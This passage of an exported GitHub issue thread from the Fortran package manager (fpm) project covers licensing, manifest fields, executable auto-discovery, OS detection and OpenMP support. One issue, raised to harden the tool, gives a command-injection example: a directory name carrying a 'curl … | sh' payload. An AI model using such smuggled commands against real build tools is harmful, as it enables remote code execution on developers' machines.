                    "user": "LKedward",
                    "date": "2020-09-12 18:26:56+00:00",
                    "text": "Thanks @awvwgk \ud83d\udc4d\n\n.. it might be more verbose to print the line of the source file as well, maybe, in case we know, even highlight the offending part in some way.\n\nGreat idea! That's a neat implementation too!\nI've now added more context output, though in most cases indicating the offending column may have to wait until a proper parsing library is used."
                }
            ]
        },
        {
            "number": 169,
            "user": "awvwgk",
            "date": "2020-09-12 11:29:56+00:00",
            "title": "Packaging license files with fpm",
            "text": "Since fpm is built around the sole purpose of linking Fortran dependencies statically into applications, there should be a mechanism do deal with license files. Currently the specified license only takes a string or maybe SPDX identifier, but this might not be sufficient for some projects, e.g. packaging for conda-forge requires to package the project license files and all license files of the statically linked dependencies.\nRequiring every project to specify the license with an SPDX identifier and either let fpm automatically collect the license files (look for COPYING*, LICENSE*, ... in the project root directory) or require the author to provide a list of license files would allow fpm to know about the more or less exact licensing situation of the application.\nThis affects packages under multiple licenses as well, the Apache-2.0 / MIT dual licensing from the Rust community is probably relevant here.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-12 16:28:40+00:00",
                    "text": "Why do we want to do this?\nIs it to safeguard the user from inadvertently importing a less permissive dependency into their project, for example, GPL dependency into a MIT project? In that case, do we want to not allow it or simply warn the user? What does Cargo do in this scenario?\nAre there other reasons to handle dependency licenses?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-12 17:12:26+00:00",
                    "text": "Most licenses require to be included with source or binary distributions in some form. I think this becomes important once we start creating distributions of any kind with fpm. But I can only speak about the projects I'm usually packaging for.\nIf fpm should support producing conda-build input like suggested in #70, it would be certainly necessary. Packing the license files is a requirement to publish on conda-forge (see https://conda-forge.org/docs/maintainer/adding_pkgs.html).\nPackaging for Arch Linux requires the inclusion of the license files as well (see https://wiki.archlinux.org/index.php/PKGBUILD#license).\nI also checked Cargo and it requires either SPDX identifiers or the license file(s) to be packaged (see https://doc.rust-lang.org/cargo/reference/manifest.html#the-license-and-license-file-fields)."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-12 17:29:26+00:00",
                    "text": "Thank you for further explaining that, I now understand better. It seems like the right thing to do."
                },
                {
                    "user": "certik",
                    "date": "2020-09-12 17:55:43+00:00",
                    "text": "Yes, I think we have to package the license.\n\u2026\nOn Sat, Sep 12, 2020, at 11:29 AM, Milan Curcic wrote:\n\n\n Thank you for further explaining that, I now understand better. It\n seems like the right thing to do.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#169 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWBLSDIBATGERB7DXATSFOVYHANCNFSM4RJM47GA>."
                }
            ]
        },
        {
            "number": 168,
            "user": "interkosmos",
            "date": "2020-09-10 18:25:26+00:00",
            "title": "Fortran interface bindings to libgit2",
            "text": "I\u2019d like to announce that I\u2019m working on a collection of Fortran 2008 ISO C binding interfaces to libgit2, as this dependency was discussed in #136 and #166. Just in case anybody else has the same idea.",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-10 18:41:25+00:00",
                    "text": "Awesome, thank you @interkosmos !"
                },
                {
                    "user": "ivan-pi",
                    "date": "2021-01-19 19:20:25+00:00",
                    "text": "@interkosmos Do you have a public repository available?"
                },
                {
                    "user": "interkosmos",
                    "date": "2021-01-19 21:22:21+00:00",
                    "text": "@ivan-pi: Not yet, although, I did not work on the interface library in the last weeks.\nCurrent status:\n-------------------------------------------------------------------------------\nLanguage                     files          blank        comment           code\n-------------------------------------------------------------------------------\nFortran 90                      26            149            129           1045\n-------------------------------------------------------------------------------\nSUM:                            26            149            129           1045\n-------------------------------------------------------------------------------\n\nI try to publish an alpha release in the next time."
                },
                {
                    "user": "interkosmos",
                    "date": "2021-09-20 14:14:20+00:00",
                    "text": "Is there any interest in turning the interface library into a community project? I\u2019ve 900 LOC and three small example programs so far."
                },
                {
                    "user": "milancurcic",
                    "date": "2021-09-20 14:28:08+00:00",
                    "text": "Yes, I think this would be very useful for fpm, and likely beyond."
                },
                {
                    "user": "interkosmos",
                    "date": "2021-09-20 14:47:26+00:00",
                    "text": "I\u2019ve created a repo here, and would like to give up the maintainership in future. Someone willing to adopt it?"
                }
            ]
        },
        {
            "number": 166,
            "user": "awvwgk",
            "date": "2020-09-07 20:20:20+00:00",
            "title": "Security of execute_command_line",
            "text": "Since we are using execute_command_line quite a lot in Fortran fpm right now, we should think about a safe alternative for all external command invokations or a way to harden the input to execute_command_line against exploits.\nInjecting bash code with directory names from fpm.toml using something like '; curl something | sh #' would be one example to exploit the current way we are handling directory names. And '; curl something | sh #' happens to be a perfectly fine directory name on Unix systems.\nAs this projects matures a security policy regarding those issues is needed to avoid having exploits discussed publicly in an issue.",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 15:05:33+00:00",
                    "text": "Eventually we should be able to not resort to execute_command_line at all.\n\nFor file system operations, we'll be able to use stdlib_os which is slated to become part of stdlib;\nFor git, we should interface libgit2.\nFor getting any other stuff from the web, we should interface curl, @interkosmos has Fortran bindings here.\n\nIn the interim, I think it's okay to be less safe in favor of prototyping."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-10 08:34:30+00:00",
                    "text": "Eventually we should be able to not resort to execute_command_line at all.\n\nDoes this include execution of compiler commands as well?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-10 11:33:30+00:00",
                    "text": "I forgot about the compilers.. :)"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-10 13:27:01+00:00",
                    "text": "My understanding is that typical security practices are to identify all user input, and ensure that it is sanitized immediately upon being read in. It's also important to have some understanding of the attack vectors you're trying to protect against. It's more about where the data comes from than the just the call to execute_command_line. For example execute_command_line(\"find ./ -name '*.f90'\") is perfectly safe, but execute_command_line(\"find ./ -name '*.\" // fortran_extension // \"'\") would not be safe if fortran_extension comes from user input.\nI'm guessing the main attack vector we're trying to protect against is a malicious fpm.toml. Conceivably, someone could put malicious code in an fpm.toml and publicize that package. Anyone listing that package as a dependency would execute the malicious code simply by building their package. So, anything being read from fpm.toml needs to be checked to make sure it is safe.\nHowever, there is an attack vector that I'm not sure we can reasonably protect against; malicious Fortran code in a package. It will always be the responsibility of users of a package to verify that it does not contain malicious Fortran code; especially if using a package not in the official registry. By the time code is fed to the compiler or makes it into an executable, fpm is not what's executing it, and can't really do anything about it."
                },
                {
                    "user": "certik",
                    "date": "2020-09-10 21:27:49+00:00",
                    "text": "Also the way fpm is designed (after #155 is merged) is that the front-end parses all user input and must ensure that nothing malicious happens, and then populates the model. We should ensure that the model does not contain anything malicious. After that it is the job of the backend to properly execute the build."
                }
            ]
        },
        {
            "number": 165,
            "user": "LKedward",
            "date": "2020-09-07 16:41:55+00:00",
            "title": "Support registry meta-data fields in manifest",
            "text": "Now that we have fpm-registry I think we should add official support for various meta-data fields in the fpm.toml manifest including description, keywords, categories, and homepage.\nLooking to cargo as an example, it requires the following fields before a crate can be published.\nChecking and validating the fields is a job for the fpm-registry CI, this issue is just to enable support within fortran fpm.",
            "comments": [
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 18:49:32+00:00",
                    "text": "It would require a schema definition or at least any kind of documentation what is allowed in a package manifest, description is actually missing in the PACKAGING.md, which I took as reference for the allowed keys.\nAlso the two available implementation follow very different strategies. The boostrap implementation ignores everything except the needed keys, while the Fortran implementation does not allow anything except the keys hardcoded in the executable."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-12 09:30:10+00:00",
                    "text": "I think adding all those keywords to the toplevel might overload the package file a bit, having additional sections for meta information would probably be best, e.g. conda-build is using about. We could support an extra section as well, which is not governed by any schema and allows to test new sections or keys."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-10-31 11:29:52+00:00",
                    "text": "Done with #171."
                }
            ]
        },
        {
            "number": 164,
            "user": "LKedward",
            "date": "2020-09-07 11:06:47+00:00",
            "title": "Automatically discover executables & tests",
            "text": "Currently you are required to explicitly specify each test and executable in the fpm manifest file.\nThis is a lot of manual work and can lead to overly-verbose manifests (see M_system for example).\nI don't think this is necessary for implementation and I would rather have executables and tests in the default locations to be discovered automatically. Is this not how cargo does it?\nThe existing [[test]] and [[executable]] entries can be retained for specifying custom settings for individual executables & tests.\nI believe this behaviour was mentioned in #105 (comment) and is also related to https://github.com/fortran-lang/fpm/issues/91.\nThis is very easy to implement in the fortran implementation from #155; the implementation already discovers all programs, but currently filters out those not specified in fpm.toml in order to match existing behaviour.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 18:31:58+00:00",
                    "text": "I'd be okay with making some changes to the \"default\" functionality, so long as the following are satisfied:\n\nIt can be easily explained to a user without many (any?) caveats and exceptions\nIt is possible to achieve exactly the same functionality when explicitly declared in fpm.toml\nIt doesn't encourage bad practices (granted that may be fairly subjective)\n\nFor example, implicit none requires the programmer to be more explicit, and involves more work, but is at this point pretty universally considered to be best practice (i.e. would be considered bad practice not to include it).\nFor me, having multiple programs and modules in one directory would be \"bad practice\", because for someone trying to understand your project, it is no longer clear which files are programs and which are modules, or which modules are used by which programs, at least not without opening and reading each file.\nI would be ok with having multiple programs in a single directory provided there are no modules in that directory. But I do struggle a bit with what it would look like to specify that in fpm.toml.\nI would also be ok with having multiple programs in separate folders being detected automatically, but I struggle a bit with what folders it should look in? Maybe just subdirectories of the app folder?\nSo with those ideas, we effectively end up with 3 possible \"default\" fpm.toml specifications.\n\nA single [[executable]] entry with app as the directory and main.f90 as the file\nSomehow specifying app as a directory containing multiple programs\nMultiple [[executable]] entries (1 for each subdirectory of app)\n\nThere are then multiple \"error\" conditions that must be checked, with some being unclear as to what the user might have expected to happen.\n\nWhat if multiple programs and 1 or more modules are found in the app folder?\nWhat if there is a file app/main.f90 and subdirectories of app?\n\nI'm open to ideas, these are just some of my concerns."
                },
                {
                    "user": "certik",
                    "date": "2020-09-08 18:40:43+00:00",
                    "text": "I think we should do it like Cargo does it, which is to agree on a standard layout and as long as you follow it, you don't have to specify anything in fpm.toml. Here is the Cargo's layout: https://doc.rust-lang.org/cargo/guide/project-layout.html\nSo we will have app/program1.f90 and app/program2.f90 to be two single file executables, and for multi file executables we will have subdirectories of app. The same layout that Cargo is doing, only instead of src/bin, we have app."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 19:47:44+00:00",
                    "text": "I think the Cargo way does make for a decently easy to understand and describe usage, although it does make explicit specification in fpm.toml more complicated, and complicates (for me at least) the most common use case, where I've got one (test) program with multiple modules. This would require me to put them in a subdirectory of app (or test) even though I've only got one. Not a big deal, just worth mentioning.\nI'd be curious to see what it would look like to specify additional details (compiler flags, link flags, etc.) for specific tests or executables as well. I'm not opposed to doing it this way, I'd just like to see some examples before we make a decision."
                },
                {
                    "user": "certik",
                    "date": "2020-09-08 20:24:24+00:00",
                    "text": "@everythingfunctional can you show an example project where you have one test program with multiple modules that you only want to be part of this test program and not the library (in src)?"
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-09 02:53:44+00:00",
                    "text": "That's how my testing framework works. All of the tests are written in modules, and all of the tests are run via a single executable. And so all of my libraries' tests are written that way."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-09 09:07:38+00:00",
                    "text": "I disagree with placing unnecessary constraints on package layout based on arguments of \"bad practice\" since there is always a package or use-case that will justifiably need to go against such constraints. The analogy with implicit none is stretching (IMO) since implicit typing easily leads to undesirable program behaviour whereas package layout is more aesthetic in nature.\nI'm proposing automatic discovery based on a default layout like Cargo, but with a simpler (and looser) set of rules:\n\nBy default, fpm looks in app, and any subdirectories therein, for executable targets;\nExecutable targets are 'module-associated' and linked with any other (non-executable) sources in the same directory as the executable source.\n\nFor me, this is simple to understand conceptually and flexible enough for all use cases.\nThis allows Brad's use-case of a single executable + multiple modules and my common use-case of multiple executables with one or two supporting (non-library) modules.\nThe corresponding 'default' fpm.toml entry would be something akin to:\napp-dir = \"app\"\ntest-dir = \"test\"\n\nwith [[executable]] and [[test]] available for individual program customisation.\nI can mock-up some working cases later as examples."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-09 14:49:33+00:00",
                    "text": "There's a mostly working demo on my program_discovery branch, where I've changed the hello_complex example to:\n\u251c\u2500\u2500 apps\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 app_mod.f90\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 say_goodbye.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 say_hello\n\u2502\u00a0\u00a0     \u251c\u2500\u2500 app_hello_mod.f90\n\u2502\u00a0\u00a0     \u2514\u2500\u2500 say_Hello.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 source\n\u2502\u00a0\u00a0 \u251c\u2500\u2500 farewell_m.f90\n\u2502\u00a0\u00a0 \u2514\u2500\u2500 greet_m.f90\n\u2514\u2500\u2500 tests\n    \u251c\u2500\u2500 farewell_test.f90\n    \u251c\u2500\u2500 greet_test.f90\n    \u2514\u2500\u2500 test_mod.f90\n\nwith manifest:\nname = \"hello_complex\"\n\napp-dir=\"apps\"\ntest-dir = \"tests\"\n\n[library]\nsource-dir=\"source\"\n\n[[executable]]\nname=\"say_hello_world\"\nsource-dir=\"apps/say_hello\"\nmain=\"say_Hello.f90\"\n\nwhich demonstrates:\n\nautomatic app/test discovery in app-dir/test-dir\n'app-private' modules (in same directory)\napp customisation in fpm.toml"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 15:11:39+00:00",
                    "text": "That's how my testing framework works. All of the tests are written in modules, and all of the tests are run via a single executable. And so all of my libraries' tests are written that way.\n\n@everythingfunctional Would this issue go away if you put your test modules in the same source file as the program that calls them? In that case the default fpm/Cargo approach would work for you out of the box without specifying anything."
                },
                {
                    "user": "certik",
                    "date": "2020-09-09 15:49:55+00:00",
                    "text": "Unlike Rust, Fortran has the advantage that we can easily figure out which modules are used by what program, so @LKedward's proposal will work great. I suggest we do that.\nFurthermore, I would suggest that for this layout:\n\u251c\u2500\u2500 apps\n\u2502   \u251c\u2500\u2500 app_mod.f90\n\u2502   \u251c\u2500\u2500 say_goodbye.f90\n\u2502   \u2514\u2500\u2500 say_hello\n\u2502       \u251c\u2500\u2500 app_hello_mod.f90\n\u2502       \u2514\u2500\u2500 say_Hello.f90\n\u251c\u2500\u2500 fpm.toml\n\u251c\u2500\u2500 src\n\u2502   \u251c\u2500\u2500 farewell_m.f90\n\u2502   \u2514\u2500\u2500 greet_m.f90\n\u2514\u2500\u2500 tests\n    \u251c\u2500\u2500 farewell_test.f90\n    \u251c\u2500\u2500 greet_test.f90\n    \u2514\u2500\u2500 test_mod.f90\n\nIt should just work with this fpm.toml:\nname = \"hello_complex\"\n\nSince fpm can figure out everything.\nWe can discuss whether the apps dir should be called app or bin or src/bin or src/app or src/apps, but the idea stays the same."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-09 17:13:21+00:00",
                    "text": "@milancurcic , no, because the program is generated by a program I wrote to scan your tests. And I don't believe we support having modules in with a program.\nI think @LKedward 's approach is probably headed in the right direction. I'll take a look at the implementation."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 20:30:56+00:00",
                    "text": "And I don't believe we support having modules in with a program.\n\nBoth Haskell and Fortran fpm support this now and we should continue to support it. I will contribute an example to the existing suite of test packages. But it's irrelevant for your use case as you say."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-13 17:10:23+00:00",
                    "text": "My most common case for tests is that all the tests call three modules. One has things like routines to compare reals and tables of numbers and statistics routines; another is a logging utility and the other is a debug utility that mostly concentrates on fail/pass procedures and allowing scripts to be called with the results (which then pass data to databases, web pages, log files, ...) So if I have multiple programs (perhaps dozens) that all use those modules and I wanted one directory for the programs and one for the modules would I put the modules in app/ and the programs in app/programs/ or the programs in app/ and the modules in app/modules/ or have app/programs and appl/modules? I am thinking any of those are better than having 20 subdirectories right now; but wondering if you are envisioning all three of those to work?\nI branched my own fpm so I could use POSIX-ony libraries like M_systems and fortran-libcurl and parse everything with M_CLI2 so I could get a better feel for how this will work some day; and I have found\n1) It is much nicer to use fpm if it looks for the fpm.toml file in directories above it which I found can be complicated by softlinks a bit but is pretty basic but requires testing if files exist and changing directories\n2) that it is really useful to have a --list option on run and test in particular to show you what programs are going to be built and their pathnames.  I also think it would be nice if that listing was written out in fpm.toml format so you could quickly build/rebuild fpm.toml; but perhaps I would not need that as much with the autoscan described above\n3) I personally found that moving past a basic build with just a few modules that having something like .gitignore becomes essential. Even as it is now I found the original fpm failing because it \"found\" some working files I had in directories or reference files. The proposed changed would have it finding even more. I often want files in a directory for reference or during development that I have to keep renaming so they are not \"discovered\". Even just being able to specify a directory NOT be searched like  A  .fmpignore with FODDER/ in it (ie. do not search directory FODDER) is handly. Not sure how common an issue that is for others, but having looked at many packages over the years they often have unused or platform-specific files sitting with the production ones.\nSo an upward search for fpm.toml; an ability to do a dry run with a listing of builds (perhaps with output in fpm.toml format; and something that lets files be ignored (the git(1) .gitignore model works for me) are on my wishlist."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-16 08:58:41+00:00",
                    "text": "So if I have multiple programs (perhaps dozens) that all use those modules and I wanted one directory for the programs and one for the modules would I put the modules in app/ and the programs in app/programs/ or the programs in app/ and the modules in app/modules/ or have app/programs and appl/modules?\n\nUnfortunately my proposed changes won't allow the configurations you've mentioned; it will avoid the need to have 20 subdirectories, but will require both modules and programs to be all in the same directory.\nA possible solution for your logging/debug modules etc. is to store them in a separate package and include them as [dev-dependencies] which are only required for the test programs.\nI would support a file ignore list as an entry in fpm.toml or as a .fpmignore file. Also dry run is a good idea that should be implemented."
                },
                {
                    "user": "certik",
                    "date": "2020-09-16 14:01:24+00:00",
                    "text": "@urbanjost fpm should have an option to allow users like you to use it. Experience with Cargo and Rust shows that having a default layout and autodiscovery works excellent for over 90% of packages, and the rest just needs some way to be able to use it, perhaps adding options to fpm.toml to disable autodiscovery as you suggested."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:16:56+00:00",
                    "text": "Closing as implemented in #190"
                }
            ]
        },
        {
            "number": 163,
            "user": "awvwgk",
            "date": "2020-09-05 19:42:31+00:00",
            "title": "Use different strategy to fetch git dependencies",
            "text": "matches strategy of GitHub's actions/checkout workflow\nuse init -> fetch -> checkout -qf FETCH_HEAD instead of current clone [-> checkout] strategy\nalways works in detached HEAD\nallows to update the git dependency with the same commands (Related: #121)\nchange directory with -C command (easier to match for later Fortran implementation, available since git 1.8.5)\n\nCan probably be implemented much nicer, but my Haskell skills don't go beyond the Try it! tutorial on haskell.org",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-08 18:50:43+00:00",
                    "text": "I was unaware of the -C path option for git. I think this is a good idea, if for no other reason than the Fortran implementation can use exactly the same commands.\nAs for the implementation, I'm not sure I would have done it any different."
                }
            ]
        },
        {
            "number": 162,
            "user": "interkosmos",
            "date": "2020-09-05 18:16:01+00:00",
            "title": "Updated OS type identification",
            "text": "As noted in the source code and discussed in #144, the OS detection of get_os_type() in fpm/src/environment.f90 is not accurate. Please review this request, which checks environment variables and the existance of some files in order to determine the OS more precisely.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-07 15:07:52+00:00",
                    "text": "Thanks @interkosmos, this looks like an improvement. Do note that you'll need to update any functions that use get_os_type such as list_files in fpm.f90 to consider all different OS behaviours.\nI'm hoping #155 will be merged soon, and this further increase the usage of get_os_type (mainly for filesystem/command_line interaction) so it may be best to wait for this to be merged?\nI have no experience with Solaris or BSD so I don't know what quirks need to be specifically addressed, but we may run into the problem that we cannot test them in the CI."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 21:06:22+00:00",
                    "text": "@LKedward BSD could be tested using Cirrus CI, which provides FreeBSD images. Grouping it together with OSX and Linux will probably be fine for most use cases right now, to avoid another CI provider for this project.\nTesting cygwin is not (easily) possible on the GH actions windows image as well, which means another CI provider would be required for this purpose (like Appveyor).\nNo idea where to find a CI solution for Solaris."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-08 09:20:14+00:00",
                    "text": "In most cases, the behaviour of OS_LINUX, OS_MACOS, OS_CYGWIN, OS_SOLARIS, and OS_FREEBSD should be identical, if we stick to POSIX standards. I can\u2019t say if there are any CI providers that feature OpenSolaris-based images (OpenIndiana, illumos, Tribblix, \u2026)."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-12 14:27:15+00:00",
                    "text": "@interkosmos, would you mind also updating the following uses of get_os_type() in order to prevent the select case statements from silently falling through?\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 51 to 56\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n           case (OS_LINUX,OS_MACOS) \n        \n\n        \n          \n               filesep = '/' \n        \n\n        \n          \n           case (OS_WINDOWS) \n        \n\n        \n          \n               filesep = '\\' \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 117 to 124\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n           case (OS_LINUX,OS_MACOS) \n        \n\n        \n          \n               call execute_command_line(\"mkdir -p \" // dir , exitstat=stat) \n        \n\n        \n          \n               write(*,*) \"mkdir -p \" // dir \n        \n\n        \n          \n           case (OS_WINDOWS) \n        \n\n        \n          \n               call execute_command_line(\"mkdir \" // windows_path(dir), exitstat=stat) \n        \n\n        \n          \n               write(*,*) \"mkdir \" // windows_path(dir) \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_filesystem.f90\n    \n    \n        Lines 148 to 158\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n               case (OS_LINUX) \n        \n\n        \n          \n                   call execute_command_line(\"ls \" // dir // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n               case (OS_MACOS) \n        \n\n        \n          \n                   call execute_command_line(\"ls \" // dir // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n               case (OS_WINDOWS) \n        \n\n        \n          \n                   call execute_command_line(\"dir /b \" // windows_path(dir) // \" > \"//temp_file, & \n        \n\n        \n          \n                                             exitstat=stat) \n        \n\n        \n          \n           end select \n        \n    \n  \n\n\n\n  \n    \n      fpm/fpm/src/fpm_command_line.f90\n    \n    \n        Lines 66 to 73\n      in\n      e02171d\n    \n    \n    \n    \n\n        \n          \n           select case (get_os_type()) \n        \n\n        \n          \n               case (OS_LINUX) \n        \n\n        \n          \n                   print *, \"OS Type: Linux\" \n        \n\n        \n          \n               case (OS_MACOS) \n        \n\n        \n          \n                   print *, \"OS Type: macOS\" \n        \n\n        \n          \n               case (OS_WINDOWS) \n        \n\n        \n          \n                   print *, \"OS Type: Windows\" \n        \n\n        \n          \n           end select"
                },
                {
                    "user": "certik",
                    "date": "2020-09-14 21:00:27+00:00",
                    "text": "The current failure is (on Windows):\nCommand line: gfortran -c -Jbuild\\gfortran_debug\\fpm -Ibuild\\gfortran_debug\\toml-f -Wall -Wextra -Wimplicit-interface -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -o build/gfortran_debug/fpm/fpm_filesystem.o src\\fpm_filesystem.f90\nExit code: 1\nStderr:\nsrc\\fpm_filesystem.f90:2:10:\n\n     use :: fpm_environment, only: get_os_type, &\n          1\nFatal Error: Can't open module file 'fpm_environment.mod' for reading at (1): No such file or directory\ncompilation terminated.\n\nSo that needs to be fixed before we can merge it."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-14 21:25:44+00:00",
                    "text": "@certik: does this happend because fpm_filesystem.f90 is compiled before fpm_environment.f90 by fpm?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-14 21:31:27+00:00",
                    "text": "@interkosmos can you try reverting to the non colon form of the use statement - this may be a bug in Haskell fpm."
                },
                {
                    "user": "interkosmos",
                    "date": "2020-09-15 12:16:11+00:00",
                    "text": "Please excuse the inconvenience."
                }
            ]
        },
        {
            "number": 161,
            "user": "awvwgk",
            "date": "2020-09-05 07:41:59+00:00",
            "title": "Build-in dependencies for fpm: OpenMP",
            "text": "OpenMP is probably one of the easiest non-fpm compatible dependency fpm could provide. OpenMP is usually shipped with the compiler. For the current scope of GCC we only have to add -fopenmp to both compile and link arguments and are done, therefore it might be a useful prototype to explore the usage of built-in dependencies for fpm.\nFollowing the current scheme an empty table would do the trick and is flexible enough to allow customization for other build-in dependencies later.\n[dependencies]\nopenmp = {}\nRelevant discussion regarding package name conflicts: fortran-lang/fpm-registry#8, in case a package wants to call itself openmp.",
            "comments": [
                {
                    "user": "LKedward",
                    "date": "2020-09-07 10:15:14+00:00",
                    "text": "I agree this is should be a simple area to prototype such features, however I'm not a fan of the proposed manifest syntax.\nIMO, this seems to be more of compiler feature that needs enabling rather than a 'dependency' that needs satisfying.\nPerhaps:\n[compiler]\nopenmp = true\nAlso in the same vein:\n[compiler]\nlto = true             # link-time optimisation\nacc = true             # OpenACC support\nfflags = \"-fopt-info\"  # Appended to built-in flags list\nlflags = \"-lblas\"\nfpm will then have a supported list of compilers for which it implements any compiler-specific syntax under the hood.\nWhat do you think?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 18:00:02+00:00",
                    "text": "True, it usually feels like a compiler command when using it, but there is a lot automation for us hidden in the compiler.\nI thought of it more like a dependency since it is handled in conda like one (see https://conda-forge.org/docs/maintainer/knowledge_base.html#openmp). Also meson is handling it usually as a dependency rather than a compiler command (see https://mesonbuild.com/Dependencies.html#openmp).\nHaving a dependency model that allows propagating linker and compiler flags would be well suited for OpenMP as well in fpm. OpenMP would be useful as simple prototype if dependencies require to export link or compile flags to a dependent project. Projects using OpenMP must propagate at least the linker flag, possibly also the library with the OpenMP implementation to dependent projects to allow correct linking."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-04 11:35:10+00:00",
                    "text": "It would be good to get this implemented so that we can self-bootstrap Fortran fpm with parallel builds enabled.\nI am however still opposed to the treatment of OpenMP as a dependency in the manifest syntax; OpenMP isn't just an additional library for linking, it changes the way the compiler behaves in processing sources and in generating code. Similarly the invocation flag and link libraries are different for each compiler. Hence why I think an entry like openmp=true in the existing [build] table is more appropriate (#112). What do other people think?\n\nHaving a dependency model that allows propagating linker and compiler flags would be well suited for OpenMP as well in fpm.\n\nAgreed, but I see no reason to conflate the manifest syntax for OpenMP with that of package dependencies."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 11:45:03+00:00",
                    "text": "I think we should get #112 working first, this would allow us to define flags on a per package basis (optimization) and global flags that propagate in the dependency tree (fast-math). Based on this we can easily implement OpenMP as either a build.openmp entry or a dependency."
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 12:10:25+00:00",
                    "text": "I am however still opposed to the treatment of OpenMP as a dependency in the manifest syntax; OpenMP isn't just an additional library for linking, it changes the way the compiler behaves in processing sources and in generating code. Similarly the invocation flag and link libraries are different for each compiler.\n\nKeep in mind that OpenMP is versioned as well, how do we deal with the fact that a program requires OpenMP version 4.5 or newer if the compiler used only provides OpenMP 3.x?\nAnother important thing is linking against the OpenMP runtime, if you use LLVM and GCC toolchains on your system you can link GCC applications with the LLVMs OpenMP runtime library and vice versa, depending on the features used. Same holds true for Intel OpenMP which can safely be linked into GCC compiled application instead of the GCC OpenMP runtime library.\nCreating an OpenMP dependency, which exports compiler flags to the dependent projects would allow to safely support various OpenMP implementation including versioning and also gives you the freedom to overwrite the OpenMP dependency by creating a mock fpm-package to export your special OpenMP setup."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-04 12:56:57+00:00",
                    "text": "Can these cases not also be specified in the [build] table, e.g.:\n[build]\nopenmp = true\nopenmp-version = \"^4.5\"\nopenmp-library = \"iomp5\"\nWe will already need logic for correctly exporting compiler options to dependents, why not use the same model for OpenMP?\nPerhaps I am misunderstanding you; is your intention that there is no special code for handling OpenMP and that the OpenMP dependency is processed internally in exactly the same way as any other dependency?"
                },
                {
                    "user": "awvwgk",
                    "date": "2021-01-04 13:35:57+00:00",
                    "text": "I would prefer to extend the current dependency model to support OpenMP on equal footing with normal fpm dependencies. With a solution for #112 we should be able to create an fpm package that will enable OpenMP support in its dependents.\nSupporting OpenMP with this approach wouldn't require any special entries in build and allows to test if this is a suitable model for OpenMP before implementing a special shortcut with build.openmp in the package manifest. I'm not opposed to create a build.openmp entry, but I wouldn't make it the first step for supporting OpenMP."
                },
                {
                    "user": "LKedward",
                    "date": "2021-01-04 14:14:03+00:00",
                    "text": "... we should be able to create an fpm package that will enable OpenMP support in its dependents.\n\nAh I see, I understand what you mean now. Thanks for explaining (and for your patience ;)). This is an elegant approach.\nSo a hypothetical default OpenMP package manifest might look something like this then:\nname=\"OpenMP\"\n\n[build]\ncompile-args.gfortran= [\"-fopenmp\"] # append\ncompile-args.ifort= [\"-qopenmp\"]\n# etc...\nor, to introduce a possible general syntax, perhaps:\nname=\"OpenMP\"\n\n[build]\n[[compiler-arg]]\ngfortran= [\"-fopenmp\"]\nifort= [\"-qopenmp\"]\n# ...\nexport = \"link\"         # export arg to linker command only\n# export = \"dependents\" # export arg up to dependent packages only\n# export = \"all\"        # export arg to entire project"
                }
            ]
        },
        {
            "number": 160,
            "user": "awvwgk",
            "date": "2020-09-03 12:52:46+00:00",
            "title": "Add contributing guidelines",
